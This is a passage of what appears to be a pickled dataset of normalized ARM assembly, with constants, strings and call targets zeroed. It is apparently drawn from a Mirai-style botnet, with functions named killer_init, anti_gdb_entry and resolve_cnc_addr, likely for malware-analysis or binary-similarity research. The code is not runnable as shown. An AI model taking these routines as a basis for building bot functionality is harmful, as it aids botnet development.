BL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R7\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nLDR~R1,<STR>\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nADD~R1,R9,0\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nMOV~R0,R6\nBEQ~FOO\nBL~FOO\nADD~R2,SP,0\nMOV~R1,R0\nADD~R2,R2,0\nMOV~R0,R6\nBL~FOO\nCMN~R0,0\nMOV~R1,0\nMOV~R0,R7\nBEQ~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R8,0\nMOV~R0,R11\nBL~FOO\nADD~R6,SP,0\nADD~R5,SP,0\nSUB~R6,R6,0\nADD~R5,R5,0\nSUBS~R9,R0,0\nSUB~R5,R5,0\nMOV~R1,0\nMOV~R0,R6\nBEQ~FOO\nCMP~R8,0\nBEQ~FOO\nMOV~R0,R11\nBL~FOO\nMOV~R0,R10\nBL~FOO\nCMP~R0,0\nBEQ~FOO\nCMP~R8,0\nBEQ~FOO\nMOV~R0,R10\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nAND~R0,R8,0\nB~FOO\nMOV~R2,R1\nMOV~LR,R0\nADD~R4,R4,0\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p245
L1392L
tp246
a(S'killer_init'
p247
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R0,0\nBL~FOO\nMOV~R10,R0\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLE~R5,R3\nORRGT~R5,R3,0\nLDR~R3,<STR>\nCMP~R5,0\nSTR~R0,[R3]\nBNE~FOO\nADD~R3,SP,0\nMOV~R6,0\nSTRB~R6,[R3,0]\nSTRB~R5,[R3,0]\nSTR~R5,[R3,0]\nMOV~R0,0\nBL~FOO\nADD~R12,SP,0\nMOV~R3,0\nMOV~R0,R6\nMOV~R1,0\nMOV~R2,R5\nSTRB~R3,[R12,0]\nSTRB~R5,[R12,0]\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nADD~R12,SP,0\nMOV~R3,0\nMOV~R0,R6\nMOV~R1,0\nMOV~R2,R5\nSTRB~R3,[R12,0]\nSTRB~R5,[R12,0]\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nBEQ~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R2,0\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R8,<STR>\nLDR~R3,<STR>\nMOV~R2,R0\nSTRB~R5,[R2]\nMOV~R0,0\nSTR~R5,[R3]\nSTR~R2,[R8]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,R5\nMOV~R0,0\nBL~FOO\nADD~R6,SP,0\nSUB~R6,R6,0\nMOV~R1,R0\nMOV~R0,R6\nBL~FOO\nADD~R4,R6,R0\nBL~FOO\nADD~R2,SP,0\nADD~R2,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nADD~R4,R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nMOV~R7,R0\nMOV~R0,R6\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R1,[R8]\nLDR~R2,<STR>\nMOV~R0,R6\nBL~FOO\nCMN~R0,0\nLDRNE~R3,[R8]\nADD~R1,R4,R7\nSTRNEB~R5,[R3,R0]\nRSB~R1,R6,R1\nMOV~R0,R6\nBL~FOO\nMOV~R4,R10\nSTR~R5,[SP,0]\nMOV~R5,0\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R0,0\nSTR~R0,[SP,0]\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nB~FOO\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nBHI~FOO\nADD~R7,R0,0\nMOV~R0,R7\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R0,R5\nADD~R3,R3,0\nMOV~R8,R0\nSTR~R3,[SP,0]\nBGT~FOO\nMOV~R0,0\nBL~FOO\nRSB~R0,R4,R0\nCMP~R0,0\nMOVGT~R5,0\nBGT~FOO\nCMP~R8,0\nBLE~FOO\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nSTR~R0,[SP]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nADD~R6,SP,0\nADD~R6,R6,0\nMOV~R1,R0\nMOV~R0,R6\nBL~FOO\nADD~R5,R6,R0\nMOV~R1,R7\nMOV~R0,R5\nBL~FOO\nMOV~R1,0\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nADD~R4,R4,R0\nMOV~R1,R7\nMOV~R0,R4\nBL~FOO\nMOV~R1,0\nMOV~R5,R0\nMOV~R0,0\nBL~FOO\nADD~R7,SP,0\nMOV~R1,R0\nADD~R0,R4,R5\nBL~FOO\nADD~R7,R7,0\nMOV~R0,0\nBL~FOO\nSUB~R7,R7,0\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nMOV~R1,R7\nLDR~R2,<STR>\nBL~FOO\nCMN~R0,0\nMOV~R5,R0\nBEQ~FOO\nADD~R12,SP,0\nADD~R12,R12,0\nLDR~R3,<STR>\nADD~R2,R12,R5\nMOV~R4,0\nSTRB~R4,[R2,R3]\nMOV~R0,0\nBL~FOO\nMOV~R1,R4\nMOV~R0,0\nBL~FOO\nSUB~R1,R5,0\nMOV~R2,R0\nMOV~R0,R7\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R0,R7\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nBL~FOO\nCMP~R8,R0\nBEQ~FOO\nLDR~R3,<STR>\nMOV~R0,R7\nLDR~R1,[R3]\nBL~FOO\nSUBS~R1,R0,0\nBNE~FOO\nMOV~R0,R7\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nMOVEQ~R0,R8\nMOVEQ~R1,0\nBLEQ~FOO\nMOV~R0,R4\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nCMN~R0,0\nMOV~R6,R0\nBEQ~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nSTR~R0,[SP,0]\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R11,R0\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nMOV~R9,R0\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nMOV~R10,R0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nMOV~R7,R0\nB~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nMOV~R1,R4\nMOV~R2,R11\nMOV~R0,R5\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nMOV~R1,R4\nMOV~R2,R9\nMOV~R0,R5\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nMOV~R1,R4\nMOV~R2,R10\nMOV~R0,R5\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nMOV~R1,R4\nMOV~R2,R7\nMOV~R0,R5\nBNE~FOO\nADD~R12,SP,0\nLDR~R3,[R12,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R0,R6\nBL~FOO\nSUBS~R4,R0,0\nLDR~R2,[SP,0]\nMOV~R1,R4\nMOV~R0,R5\nBGT~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R0,R8\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R4,[SP]\nMOV~R5,R8\nLDR~R0,[SP,0]\nBL~FOO\nCMP~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p248
L1644L
tp249
a(S'anti_gdb_entry'
p250
S'"LDR~R2,<STR>\nLDR~R3,<STR>\nSTR~R2,[R3]\nRET"'
p251
L16L
tp252
a(S'teardown_connection'
p253
S'"STMFD~SP!,{R4,LR}\nLDR~R4,<STR>\nLDR~R0,[R4]\nCMN~R0,0\nBLNE~FOO\nMOV~R3,0\nMOV~R0,0\nSTR~R3,[R4]\nLDMFD~SP!,{R4,LR}\nB~FOO"'
p254
L40L
tp255
a(S'ensure_single_instance'
p256
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R5,0\nSUB~SP,SP,0\nMOV~R0,0\nMOV~R1,R5\nMOV~R2,0\nSTR~R5,[SP,0]\nBL~FOO\nLDR~R4,<STR>\nCMN~R0,0\nSTR~R0,[R4]\nBEQ~FOO\nADD~R3,SP,0\nMOV~R1,R5\nMOV~R2,0\nADD~R5,R5,0\nSTR~R5,[SP]\nBL~FOO\nLDR~R4,[R4]\nMOV~R1,0\nMOV~R2,0\nMOV~R0,R4\nBL~FOO\nMOV~R1,R5\nORR~R2,R0,0\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nLDREQ~R3,<STR>\nLDREQ~R2,[R3]\nMOV~R3,0\nLDRNE~R2,<STR>\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nMOV~R6,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nSTR~R2,[SP,0]\nSTRB~R3,[SP,0]\nSTRB~R6,[SP,0]\nBL~FOO\nLDR~R5,<STR>\nSTR~R6,[R0]\nADD~R7,SP,0\nMOV~R4,R0\nMOV~R1,R7\nLDR~R0,[R5]\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nBNE~FOO\nLDR~R2,<STR>\nLDRB~R3,[R2]\nCMP~R3,R6\nSTRNEB~R6,[R2]\nLDR~R4,<STR>\nMOV~R3,0\nSTRB~R3,[SP,0]\nADD~R3,R3,0\nMOV~R12,0\nMOV~R1,R7\nMOV~R2,0\nSTRB~R3,[SP,0]\nLDR~R0,[R4]\nADD~R3,R3,0\nSTR~R12,[SP,0]\nSTRB~R3,[SP,0]\nSTRB~R12,[SP,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,[R4]\nBL~FOO\nLDR~R0,<STR>\nBL~FOO\nBL~FOO\nB~FOO\nLDR~R0,[R5]\nMOV~R1,0\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R7,PC}"'
p257
L348L
tp258
a(S'main'
p259
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nADD~R4,SP,0\nADD~R4,R4,0\nMOV~R11,R0\nLDR~R0,[R1]\nMOV~R9,R1\nBL~FOO\nMOV~R0,R4\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nMOV~R2,R0\nMOV~R1,R4\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nLDR~R1,<STR>\nMOV~R0,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nBNE~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nBEQ~FOO\nADD~R2,SP,0\nMOV~R3,0\nMOV~R0,R4\nLDR~R1,<STR>\nADD~R2,R2,0\nSTR~R3,[SP,0]\nBL~FOO\nMOV~R0,R4\nBL~FOO\nLDR~R0,<STR>\nBL~FOO\nBL~FOO\nLDR~R3,<STR>\nLDR~R12,<STR>\nSTR~R0,[R3]\nMOV~R3,0\nSTRB~R3,[R12,0]\nMOV~R3,0\nSTRB~R3,[R12]\nLDR~R3,<STR>\nMOV~R4,0\nADD~R0,SP,0\nSTR~R3,[R12,0]\nLDR~R1,<STR>\nMOV~R2,0\nSTRB~R4,[R12,0]\nSTRB~R4,[R12,0]\nADD~R0,R0,0\nLDR~R8,[R9]\nBL~FOO\nLDR~R3,<STR>\nMOV~LR,R3\nLDMIA~LR!,{R0-R3}\nADD~R12,SP,0\nADD~R12,R12,0\nSTMIA~R12!,{R0-R3}\nLDMIA~LR!,{R0-R3}\nSTMIA~R12!,{R0-R3}\nLDR~R3,[LR]\nSTR~R3,[R12]\nMOV~R2,R4\nADD~R3,SP,0\nADD~R3,R3,0\nLDR~R3,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nADD~R4,R4,R3\nBNE~FOO\nCMP~R4,0\nBEQ~FOO\nMOV~R4,0\nADD~R7,SP,0\nMOV~R1,R4\nMOV~R6,0\nADD~R7,R7,0\nADD~R2,SP,0\nADD~R3,R2,R4\nLDRB~R2,[R3,-0]\nADD~R10,SP,0\nLDRB~R3,[R3,-0]\nADD~R10,R10,0\nSTRB~R2,[R1,R10]\nMOV~R0,R8\nADD~R5,R1,0\nSTRB~R3,[R7,0]\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nLDRB~R3,[R8,R0]\nMOV~R4,R4,LSL0\nADD~R4,R4,0\nMVN~R3,R3\nMOV~R4,R4,ASR0\nADD~R3,R6,R3\nCMP~R5,0\nAND~R6,R3,0\nSUB~R4,R4,0\nADD~R7,R7,0\nMOV~R1,R5\nBNE~FOO\nMOV~R1,0\nMOV~R0,R6\nBL~FOO\nMOV~R0,R0,LSL0\nADD~R3,SP,0\nAND~R0,R0,0\nADD~R0,R0,R3\nMOV~LR,PC\nLDR~PC,[R0,-0]\nMOV~R1,R10\nMOV~R0,R8\nBL~FOO\nMOV~R4,R0\nADD~R0,SP,0\nMOV~R1,0\nADD~R0,R0,0\nBL~FOO\nMOV~R0,R10\nMOV~R1,R5\nBL~FOO\nTST~R4,0\nMOVNE~R0,0\nBLNE~FOO\nADD~R4,SP,0\nADD~R4,R4,0\nBL~FOO\nBL~FOO\nMOV~R0,R4\nMOV~R1,0\nBL~FOO\nCMP~R11,0\nBNE~FOO\nLDR~R0,[R9,0]\nBL~FOO\nCMP~R0,0\nBGT~FOO\nLDR~R1,[R9,0]\nMOV~R0,R4\nBL~FOO\nLDR~R4,[R9,0]\nMOV~R0,R4\nBL~FOO\nMOV~R1,R0\nMOV~R0,R4\nBL~FOO\nBL~FOO\nAND~R4,R0,0\nMOV~R4,R4,LSL0\nADD~R5,SP,0\nADD~R5,R5,0\nADD~R4,R4,0\nMOV~R1,R4\nMOV~R0,R5\nBL~FOO\nADD~R1,SP,0\nADD~R3,R1,R4\nMOV~R6,0\nMOV~R1,R5\nLDR~R0,[R9]\nSTRB~R6,[R3,-0]\nBL~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0,LSL0\nADD~R4,R4,0\nMOV~R0,R5\nMOV~R1,R4\nBL~FOO\nADD~R2,SP,0\nADD~R3,R2,R4\nSTRB~R6,[R3,-0]\nMOV~R1,R5\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nADD~R1,SP,0\nADD~R1,R1,0\nMOV~R0,0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R0\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nMOV~R2,R0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nCMP~R0,R6\nBGT~FOO\nBL~FOO\nMOV~R9,R0\nMOV~R0,R6\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nMOV~R10,R6\nMOV~R2,0\nADD~R3,SP,0\nMOV~R1,0\nADD~R3,R3,0\nSTR~R1,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nMOV~R2,R1\nADD~R3,SP,0\nMOV~R6,0\nADD~R3,R3,0\nSTR~R6,[R2,R3]\nADD~R2,R2,0\nCMP~R2,0\nBNE~FOO\nLDR~R3,<STR>\nLDR~R1,[R3]\nCMN~R1,0\nBEQ~FOO\nMOV~R3,R1,LSR0\nADD~R2,SP,0\nADD~R0,R2,R3,LSL0\nLDR~R3,[R0,-0]\nAND~R1,R1,0\nMOV~R2,0\nORR~R3,R3,R2,LSLR1\nSTR~R3,[R0,-0]\nLDR~R5,<STR>\nLDR~R3,[R5]\nCMN~R3,0\nBNE~FOO\nMOV~R0,0\nMOV~R1,0\nMOV~R2,R6\nBL~FOO\nCMN~R0,0\nMOV~R4,R0\nSTR~R0,[R5]\nBEQ~FOO\nMOV~R2,R6\nMOV~R1,0\nBL~FOO\nMOV~R1,0\nORR~R2,R0,0\nMOV~R0,R4\nBL~FOO\nLDR~R3,<STR>\nLDR~R3,[R3]\nCMP~R3,0\nMOVNE~LR,PC\nMOVNE~PC,R3\nLDR~R3,<STR>\nMOV~R12,0\nLDR~R0,[R5]\nLDR~R1,<STR>\nMOV~R2,0\nSTRB~R12,[R3]\nBL~FOO\nLDR~R3,<STR>\nLDRB~R3,[R3]\nCMP~R3,0\nLDR~R8,<STR>\nBEQ~FOO\nLDR~R1,[R8]\nADD~R2,SP,0\nMOV~R3,R1,LSR0\nADD~R0,R2,R3,LSL0\nLDR~R3,[R0,-0]\nAND~R1,R1,0\nMOV~R2,0\nORR~R3,R3,R2,LSLR1\nSTR~R3,[R0,-0]\nB~FOO\nLDR~R1,[R8]\nADD~R2,SP,0\nMOV~R3,R1,LSR0\nADD~R0,R2,R3,LSL0\nLDR~R3,[R0,-0]\nAND~R1,R1,0\nMOV~R2,0\nORR~R3,R3,R2,LSLR1\nSTR~R3,[R0,-0]\nLDR~R3,<STR>\nLDR~R4,<STR>\nLDR~R0,[R3]\nLDR~R3,[R4]\nMOV~R12,0\nCMP~R0,R3\nMOVLT~R0,R3\nMOV~LR,0\nSTR~R12,[SP,0]\nADD~R1,SP,0\nADD~R2,SP,0\nADD~R12,SP,0\nMOV~R3,LR\nADD~R12,R12,0\nADD~R0,R0,0\nADD~R1,R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nSTR~LR,[SP,0]\nBL~FOO\nCMN~R0,0\nMOV~R3,R0\nBEQ~FOO\nCMP~R0,0\nBNE~FOO\nMOV~R0,R10\nMOV~R1,0\nSTRB~R3,[SP,0]\nSTRB~R3,[SP,0]\nBL~FOO\nCMP~R0,0\nADD~R10,R10,0\nBNE~FOO\nADD~R1,SP,0\nLDR~R0,[R4]\nADD~R1,R1,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,<STR>\nLDR~R0,[R3]\nCMN~R0,0\nBEQ~FOO\nMOV~R3,R0,LSR0\nADD~R1,SP,0\nADD~R3,R1,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R0,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nADD~R1,SP,0\nADD~R2,SP,0\nMOV~R3,0\nADD~R1,R1,0\nADD~R2,R2,0\nSTR~R3,[SP,0]\nBL~FOO\nBL~FOO\nBL~FOO\nBL~FOO\nRSB~R0,R9,0\nMOV~R1,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R1,<STR>\nLDRB~R5,[R1]\nCMP~R5,0\nLDR~R8,<STR>\nBEQ~FOO\nLDR~R0,[R8]\nADD~R2,SP,0\nMOV~R3,R0,LSR0\nADD~R3,R2,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R0,0\nMOV~R3,R3,LSRR2\nMOV~R12,0\nTST~R3,0\nSTRB~R12,[R1]\nBEQ~FOO\nMOV~R4,0\nADD~R3,SP,0\nADD~R3,R3,0\nSTR~R12,[SP,0]\nMOV~R1,0\nADD~R12,SP,0\nMOV~R2,R4\nSTR~R12,[SP]\nSTR~R4,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nBEQ~FOO\nLDR~R0,[R8]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R8]\nBL~FOO\nMOV~R1,0\nBL~FOO\nADD~R0,R0,0\nBL~FOO\nB~FOO\nADD~R5,SP,0\nADD~R5,R5,0\nMOV~R0,R5\nBL~FOO\nSTRB~R0,[SP,0]\nBL~FOO\nLDR~R3,<STR>\nMOV~R2,R4\nSTR~R0,[R3]\nLDR~R1,<STR>\nMOV~R3,0\nLDR~R0,[R8]\nBL~FOO\nADD~R1,SP,0\nMOV~R2,0\nLDR~R0,[R8]\nADD~R1,R1,0\nMOV~R3,0\nBL~FOO\nLDRB~R2,[SP,0]\nCMP~R2,0\nBEQ~FOO\nLDR~R0,[R8]\nMOV~R1,R5\nMOV~R3,0\nBL~FOO\nB~FOO\nLDR~R2,[R8]\nCMN~R2,0\nMOV~R6,R8\nBEQ~FOO\nMOV~R3,R2,LSR0\nADD~R1,SP,0\nADD~R3,R1,R3,LSL0\nLDR~R3,[R3,-0]\nAND~R2,R2,0\nMOV~R3,R3,LSRR2\nTST~R3,0\nBEQ~FOO\nBL~FOO\nADD~R7,SP,0\nSTR~R5,[R0]\nADD~R7,R7,0\nMOV~R4,R0\nMOV~R1,R7\nLDR~R0,[R8]\nMOV~R2,0\nLDR~R3,<STR>\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nCMP~R0,0\nBEQ~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R2,R2,R3,LSL0\nBNE~FOO\nLDR~R0,[R8]\nMOV~R1,R7\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nB~FOO\nAND~R3,R2,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R2,LSR0\nMOV~R2,R3,ASR0\nCMP~R3,0\nSTRB~R2,[SP,0]\nSTRB~R3,[SP,0]\nBLS~FOO\nLDR~R0,[R8]\nBL~FOO\nMOV~R3,0\nSTR~R3,[R8]\nSTR~R5,[R4]\nLDRB~R3,[SP,0]\nLDRB~R2,[SP,0]\nADD~R5,SP,0\nSUB~R5,R5,0\nORR~R2,R3,R2,LSL0\nLDR~R0,[R6]\nMOV~R1,R5\nLDR~R3,<STR>\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R3,[R4]\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nB~FOO\nCMP~R0,0\nBNE~FOO\nBL~FOO\nB~FOO\nMOV~R1,R7\nMOV~R2,0\nMOV~R3,0\nLDR~R0,[R8]\nBL~FOO\nLDRB~R3,[SP,0]\nLDRB~R12,[SP,0]\nORR~R12,R12,R3,LSL0\nMOV~R2,R12\nMOV~LR,R12,ASR0\nMOV~R1,R5\nMOV~R3,0\nLDR~R0,[R8]\nSTRB~LR,[SP,0]\nSTRB~R12,[SP,0]\nBL~FOO\nLDRB~R2,[SP,0]\nLDRB~R3,[SP,0]\nORRS~R1,R2,R3,LSL0\nBEQ~FOO\nMOV~R0,R5\nBL~FOO\nB~FOO\nMOV~R0,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p260
L2128L
tp261
a(S'resolve_cnc_addr'
p262
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nBL~FOO\nMOV~R5,R0\nMOV~R0,0\nBL~FOO\nCMP~R5,0\nLDR~R6,<STR>\nLDMEQFD~SP!,{R4-R6,PC}\nLDR~R4,[R5,0]\nBL~FOO\nLDRB~R1,[R5]\nBL~FOO\nLDR~R3,[R4,R0,LSL0]\nMOV~R0,R5\nSTR~R3,[R6,0]\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nLDRB~R2,[R0,0]\nLDRB~R3,[R0]\nORR~R3,R3,R2,LSL0\nMOV~R2,R3,ASR0\nMOV~R0,0\nSTRB~R2,[R6,0]\nSTRB~R3,[R6,0]\nLDMFD~SP!,{R4-R6,LR}\nB~FOO"'
p263
L140L
tp264
a(S'rand_next'
p265
S'"STMFD~SP!,{R4-R6,LR}\nLDR~R5,<STR>\nLDR~R6,<STR>\nLDR~R3,[R5]\nLDR~R2,[R6]\nLDR~LR,<STR>\nLDR~R4,<STR>\nEOR~R3,R3,R3,LSL0\nEOR~R0,R2,R2,LSR0\nLDR~R1,[LR]\nLDR~R12,[R4]\nEOR~R0,R3,R0\nEOR~R0,R0,R3,LSR0\nSTR~R1,[R5]\nSTR~R12,[LR]\nSTR~R2,[R4]\nSTR~R0,[R6]\nLDMFD~SP!,{R4-R6,PC}"'
p266
L72L
tp267
a(S'rand_str'
p268
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R5,R0\nMOV~R4,R1\nB~FOO\nCMP~R4,0\nBLE~FOO\nBL~FOO\nSTR~R0,[R5]\nSUB~R4,R4,0\nB~FOO\nCMP~R4,0\nSUB~R4,R4,0\nBEQ~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5]\nADD~R5,R5,0\nB~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R4,0\nCMP~R4,0\nBGT~FOO\nLDMFD~SP!,{R4,R5,PC}"'
p269
L100L
tp270
a(S'rand_alphastr'
p271
S'"STMFD~SP!,{R4,R5,LR}\nSUB~SP,SP,0\nMOV~R5,R0\nMOV~R4,R1\nADD~R0,SP,0\nLDR~R1,<STR>\nMOV~R2,0\nBL~FOO\nB~FOO\nCMP~R4,0\nBLS~FOO\nBL~FOO\nMOV~R1,R5\nMOV~R2,0\nAND~R3,R0,0\nADD~R12,SP,0\nADD~R3,R12,R3,LSR0\nLDRB~R3,[R3,-0]\nADD~R2,R2,0\nCMP~R2,0\nSTRB~R3,[R1]\nMOV~R0,R0,LSR0\nBNE~FOO\nADD~R5,R5,0\nSUB~R4,R4,0\nB~FOO\nBL~FOO\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5]\nSUB~R4,R4,0\nCMP~R4,0\nBGT~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4,R5,PC}"'
p272
L140L
tp273
a(S'rand_init'
p274
S'"STMFD~SP!,{R4,R5,LR}\nMOV~R0,0\nBL~FOO\nLDR~R3,<STR>\nSTR~R0,[R3]\nBL~FOO\nMOV~R4,R0\nBL~FOO\nLDR~R5,<STR>\nEOR~R4,R4,R0\nSTR~R4,[R5]\nBL~FOO\nLDR~R3,[R5]\nLDR~R2,<STR>\nEOR~R3,R0,R3\nSTR~R3,[R2]\nLDR~R3,<STR>\nSTR~R0,[R3]\nLDMFD~SP!,{R4,R5,PC}"'
p275
L76L
tp276
a(S'resolv_skip_name'
p277
S'"STR~LR,[SP,-0]\nMOV~R3,0\nMOV~LR,0\nB~FOO\nCMP~R12,0\nBLS~FOO\nLDRB~R3,[R0,0]\nADD~R3,R3,R12,LSL0\nSUB~R3,R3,0\nMOV~LR,0\nADD~R0,R1,R3\nB~FOO\nCMP~LR,0\nADD~R0,R0,0\nBNE~FOO\nLDR~R3,[R2]\nADD~R3,R3,0\nSTR~R3,[R2]\nLDRB~R12,[R0]\nCMP~R12,0\nBNE~FOO\nCMP~LR,0\nLDREQ~R3,[R2]\nADDEQ~R3,R3,0\nSTREQ~R3,[R2]\nLDR~PC,[SP]"'
p278
L104L
tp279
a(S'resolv_entries_free'
p280
